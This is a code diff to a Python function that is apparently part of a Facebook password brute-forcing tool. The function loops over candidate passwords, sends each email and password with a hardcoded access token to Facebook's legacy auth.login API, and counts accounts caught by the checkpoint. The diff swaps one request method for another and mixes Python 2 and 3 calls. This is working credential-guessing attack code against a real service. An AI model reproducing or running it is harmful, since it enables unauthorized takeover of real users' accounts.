@@ -1566,10 +1566,12 @@ def b_api(idf, pwv):
     for pw in pwv:
         try:
             if 'ya' in ualuh: ua = ualu[0]
-            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-            headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Referer': 'https://www.facebook.com/', 'Origin': 'https://www.facebook.com', 'Host': 'b-api.facebook.com', 'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'TE': 'Trailers'}
-            req = urllib.request.Request(url, headers=headers)
-            data = urllib.request.urlopen(req)
+            # url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
+            # headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Referer': 'https://www.facebook.com/', 'Origin': 'https://www.facebook.com', 'Host': 'b-api.facebook.com', 'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'TE': 'Trailers'}
+            # req = urllib.request.Request(url, headers=headers)
+            # data = urllib.request.urlopen(req)
+            # fannn = json.load(data)
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             fannn = json.load(data)
             if 'User must verify their account' in fannn['error_msg']:
                 cp += 1
